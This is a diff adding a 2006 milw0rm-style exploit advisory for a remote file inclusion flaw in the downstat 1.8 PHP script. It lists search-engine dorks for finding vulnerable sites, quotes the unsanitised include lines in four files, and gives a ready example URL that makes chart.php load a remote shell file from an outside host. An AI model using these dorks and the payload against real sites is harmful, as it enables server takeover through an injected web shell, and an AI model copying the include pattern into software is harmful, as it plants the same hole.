@@ -1,0 +1,36 @@
+DESCRIPTION: Remote file include vuln found by sZ [sept, 8 2006.]
+SOFTWARE: downstat 1.8
+VENDOR URL: http://vmist.net/index.php?script=Downstat
+DORKs:
+"Login To Downstat 1.8"
+allinurl:"/downstat/"
+ 
+
+NOTES: greetz to: neo-vortex, sk0tie, icez. visit @ irc.bluehell.org #silenz
+ 
+
+VULN CODE:
+------
+admin.php:
+ 
+if(!@include($art."in_php.php")) exit("upload ".$art."in_php.php");
+ 
+------
+chart.php:
+ 
+if(!@include($art."downstat_art/in_html.php")){ exit("upload ".$art."in_html.php"); }
+------
+modes.php
+ 
+if(!@include($art."downstat_art/in_html.php")){ exit("upload ".$art."in_html.php"); }  
+-----
+stats.php
+ 
+if(!@include($art."downstat_art/in_html.php")){ exit("upload ".$art."in_html.php"); }
+----
+ 
+
+EXAMPLE:
+http://site.com/downstat1.8/chart.php?art=http://silenz.be/shell.txt?
+
+# milw0rm.com [2006-09-13]
